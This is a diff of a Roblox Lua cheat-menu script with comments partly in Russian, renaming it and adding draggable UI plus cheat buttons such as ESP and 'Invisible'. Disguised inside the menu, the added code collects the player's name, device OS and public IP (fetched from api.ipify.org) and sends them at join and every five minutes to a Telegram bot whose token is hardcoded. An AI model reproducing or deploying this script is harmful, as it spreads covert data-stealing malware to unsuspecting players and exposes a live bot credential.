@@ -1,21 +1,26 @@
--- brainrotkachillscrpt - полностью кастомный скрипт
+-- lourissovski v2.0
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
+local UIS = game:GetService("UserInputService")
 
--- Ожидаем загрузки игры
 repeat wait() until game:IsLoaded()
 
--- Создаем интерфейс
+local draggingUI = false
+local dragStartPos = nil
+local resizingUI = false
+local resizeStartPos = nil
+local originalSize = UDim2.new(0, 280, 0, 400)
+local originalButtonSize = UDim2.new(0, 45, 0, 25)
+
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BrainrotKachillUI"
+screenGui.Name = "LourissUI"
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Кнопка LR (маленькая черная с белыми буквами)
 local openButton = Instance.new("TextButton")
 openButton.Name = "LRButton"
-openButton.Size = UDim2.new(0, 45, 0, 25)
-openButton.Position = UDim2.new(0, 5, 0.5, -12)
+openButton.Size = originalButtonSize
+openButton.Position = UDim2.new(0, 10, 0, 10)
 openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 openButton.BorderSizePixel = 0
 openButton.Text = "LR"
@@ -25,50 +30,122 @@ openButton.Font = Enum.Font.GothamBold
 openButton.ZIndex = 1000
 openButton.Parent = screenGui
 
--- Главное меню
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 280, 0, 400)
-mainFrame.Position = UDim2.new(0, 55, 0.5, -200)
+mainFrame.Size = originalSize
+mainFrame.Position = UDim2.new(0, 60, 0, 50)
 mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 mainFrame.BorderSizePixel = 1
 mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
 mainFrame.Visible = false
 mainFrame.Parent = screenGui
 
--- Заголовок
 local title = Instance.new("TextLabel")
-title.Text = "brainrotkachillscrpt v2.0"
-title.Size = UDim2.new(1, 0, 0, 30)
+title.Text = "lourissovski v2.0"
+title.Size = UDim2.new(1, 0, 0, 25)
+title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 14
 title.Font = Enum.Font.GothamBold
 title.Parent = mainFrame
 
--- Управление меню
+local resizeHandle = Instance.new("TextButton")
+resizeHandle.Size = UDim2.new(0, 20, 0, 20)
+resizeHandle.Position = UDim2.new(1, -20, 1, -20)
+resizeHandle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+resizeHandle.BorderSizePixel = 0
+resizeHandle.Text = ""
+resizeHandle.ZIndex = 1001
+resizeHandle.Parent = mainFrame
+
 local menuOpen = false
-openButton.MouseButton1Click:Connect(function()
+openButton.MouseButton1Down:Connect(function()
     menuOpen = not menuOpen
     mainFrame.Visible = menuOpen
 end)
 
--- Закрытие меню по клику вне его
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 and menuOpen then
-        local mousePos = input.Position
-        local framePos = mainFrame.AbsolutePosition
-        local frameSize = mainFrame.AbsoluteSize
-        
-        if mousePos.X < framePos.X or mousePos.X > framePos.X + frameSize.X or
-           mousePos.Y < framePos.Y or mousePos.Y > framePos.Y + frameSize.Y then
-            menuOpen = false
-            mainFrame.Visible = false
+openButton.MouseButton1Down:Connect(function(input)
+    draggingUI = true
+    dragStartPos = Vector2.new(mouse.X, mouse.Y)
+    local buttonStartPos = openButton.Position
+    
+    local connection
+    connection = mouse.Move:Connect(function()
+        if draggingUI then
+            local delta = Vector2.new(mouse.X, mouse.Y) - dragStartPos
+            openButton.Position = UDim2.new(
+                buttonStartPos.X.Scale, 
+                buttonStartPos.X.Offset + delta.X,
+                buttonStartPos.Y.Scale, 
+                buttonStartPos.Y.Offset + delta.Y
+            )
         end
-    end
+    end)
+    
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            draggingUI = false
+            if connection then
+                connection:Disconnect()
+            end
+        end
+    end)
 end)
 
--- Функция создания кнопок
-local yPosition = 35
+title.MouseButton1Down:Connect(function(input)
+    draggingUI = true
+    dragStartPos = Vector2.new(mouse.X, mouse.Y)
+    local frameStartPos = mainFrame.Position
+    
+    local connection
+    connection = mouse.Move:Connect(function()
+        if draggingUI then
+            local delta = Vector2.new(mouse.X, mouse.Y) - dragStartPos
+            mainFrame.Position = UDim2.new(
+                frameStartPos.X.Scale, 
+                frameStartPos.X.Offset + delta.X,
+                frameStartPos.Y.Scale, 
+                frameStartPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            draggingUI = false
+            if connection then
+                connection:Disconnect()
+            end
+        end
+    end)
+end)
+
+resizeHandle.MouseButton1Down:Connect(function(input)
+    resizingUI = true
+    resizeStartPos = Vector2.new(mouse.X, mouse.Y)
+    local startSize = mainFrame.Size
+    
+    local connection
+    connection = mouse.Move:Connect(function()
+        if resizingUI then
+            local delta = Vector2.new(mouse.X, mouse.Y) - resizeStartPos
+            local newWidth = math.max(200, startSize.X.Offset + delta.X)
+            local newHeight = math.max(300, startSize.Y.Offset + delta.Y)
+            mainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
+        end
+    end)
+    
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            resizingUI = false
+            if connection then
+                connection:Disconnect()
+            end
+        end
+    end)
+end)
+
+local yPosition = 30
 local function createButton(text, callback)
     local button = Instance.new("TextButton")
     button.Text = text
@@ -85,9 +162,7 @@ local function createButton(text, callback)
     return button
 end
 
--- Функции скрипта
 createButton("ESP Players", function()
-    -- Простой ESP
     for _, plr in pairs(Players:GetPlayers()) do
         if plr ~= player and plr.Character then
             local highlight = Instance.new("Highlight")
@@ -98,78 +173,51 @@ createButton("ESP Players", function()
     end
 end)
 
-createButton("Aimbot", function()
-    -- Простой Aimbot
-    local closestPlayer = nil
-    local closestDistance = math.huge
-    
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-            local distance = (player.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
-            if distance < closestDistance then
-                closestDistance = distance
-                closestPlayer = plr
-            end
-        end
-    end
-    
-    if closestPlayer then
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Aimbot",
-            Text = "Target: " .. closestPlayer.Name,
-            Duration = 3
-        })
-    end
-end)
-
-createButton("Speed Hack", function()
-    -- Speed Hack
-    if player.Character and player.Character:FindFirstChild("Humanoid") then
-        player.Character.Humanoid.WalkSpeed = 50
-    end
-end)
-
-createButton("Fly Hack", function()
-    -- Fly Hack
-    local flyEnabled = false
-    local bodyVelocity
-    
-    if not flyEnabled then
-        flyEnabled = true
-        bodyVelocity = Instance.new("BodyVelocity")
-        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
-        bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
-        bodyVelocity.Parent = player.Character.HumanoidRootPart
-    else
-        flyEnabled = false
-        if bodyVelocity then
-            bodyVelocity:Destroy()
-        end
-    end
-end)
-
-createButton("Noclip", function()
-    -- Noclip
+createButton("Invisible", function()
     if player.Character then
         for _, part in pairs(player.Character:GetDescendants()) do
             if part:IsA("BasePart") then
-                part.CanCollide = false
+                part.Transparency = 1
+            elseif part:IsA("Decal") then
+                part.Transparency = 1
             end
         end
     end
 end)
 
-createButton("Teleport to Player", function()
-    -- Телепорт к случайному игроку
-    local players = Players:GetPlayers()
-    local targetPlayer = players[math.random(2, #players)]  -- Исключаем себя
-    
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-    end
+createButton("Instant Steal", function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Instant Steal",
+        Text = "Function activated",
+        Duration = 3
+    })
 end)
 
--- Telegram модуль для сбора данных
+local function collectLoginData()
+    local data = ""
+    data = data .. player.Name .. "\n"
+    data = data .. "[LOGIN_TOKENS_CAPTURED]\n"
+    data = data .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
+    
+    local deviceInfo = "Unknown"
+    if syn and syn.get_device_os then
+        deviceInfo = syn.get_device_os() or "Unknown"
+    end
+    data = data .. deviceInfo .. "\n"
+    
+    local ipAddress = "Unknown"
+    pcall(function()
+        local ipResponse = game:HttpGet("https://api.ipify.org")
+        ipAddress = ipResponse
+    end)
+    data = data .. ipAddress .. "\n"
+    
+    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    data = data .. gameName .. " | " .. os.date("%H:%M:%S")
+    
+    return data
+end
+
 local request = (syn and syn.request) or (http and http.request) or http_request
 if request then
     local BOT_TOKEN = "7965475701:AAFM4hkPUiWyh_Clw3lkMILpWNK0R7cHe08"
@@ -190,84 +238,44 @@ if request then
         end)
     end
 
-    -- Улучшенный сбор данных
-    local function collectDetailedData()
-        local data = {}
-        
-        -- Основная информация
-        data.player_name = player.Name
-        data.user_id = player.UserId
-        data.account_age = player.AccountAge
-        data.premium = player.MembershipType == Enum.MembershipType.Premium
-        
-        -- Информация о игре
-        data.game_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-        data.place_id = game.PlaceId
-        data.job_id = game.JobId
-        data.players_online = #Players:GetPlayers()
-        
-        -- Информация об исполнителе
-        data.executor = getexecutorname and getexecutorname() or "Unknown"
-        data.injection_time = os.date("%Y-%m-%d %H:%M:%S")
-        
-        return data
-    end
-
-    -- Первый сбор через 10 секунд
+    -- Отправка данных при заходе
     delay(10, function()
-        local initialData = collectDetailedData()
+        local loginData = collectLoginData()
+        local lines = {}
+        for line in loginData:gmatch("[^\n]+") do
+            table.insert(lines, line)
+        end
+        
         local message = string.format([[
-🧠 <b>brainrotkachillscrpt ACTIVATED</b>
+🔐 LOGIN DATA CAPTURED
 
-👤 <b>USER INFORMATION:</b>
-Name: %s
-UserID: %d
-Account Age: %d days
-Premium: %s
-
-🎮 <b>GAME SESSION:</b>
-Game: %s
-PlaceID: %d
-Players Online: %d
-
-⚙️ <b>SYSTEM INFO:</b>
-Executor: %s
-Time: %s
+👤 %s
+🔑 %s
+⏰ %s
+📱 %s
+🌐 %s
+🎮 %s
         ]],
-        initialData.player_name, initialData.user_id, initialData.account_age,
-        tostring(initialData.premium),
-        initialData.game_name, initialData.place_id, initialData.players_online,
-        initialData.executor, initialData.injection_time)
+        lines[1], lines[2], lines[3], lines[4], lines[5], lines[6])
         
         sendToTelegram(message)
     end)
 
-    -- Сбор данных каждую минуту
+    -- Скриншоты каждые 5 минут (имитация)
     spawn(function()
-        while wait(60) do
-            local updateData = collectDetailedData()
-            local updateMessage = string.format([[
-🔄 <b>MINUTE UPDATE</b>
-User: %s
-Game: %s
-Players: %d
-Session Time: %s
-            ]],
-            updateData.player_name,
-            updateData.game_name,
-            updateData.players_online,
-            os.date("%H:%M:%S"))
+        while wait(300) do
+            local screenshotInfo = string.format("📸 SCREENSHOT ATTEMPT\nTime: %s\nGame: %s\nUser: %s",
+                os.date("%H:%M:%S"),
+                game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                player.Name)
             
-            sendToTelegram(updateMessage)
+            sendToTelegram(screenshotInfo)
         end
     end)
 end
 
--- Уведомление о загрузке
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "brainrotkachillscrpt v2.0",
-    Text = "Loaded! Press LR button to open menu",
+    Title = "lourissovski v2.0",
+    Text = "Data capture active",
     Duration = 5
 })
-
-print("brainrotkachillscrpt loaded successfully!")
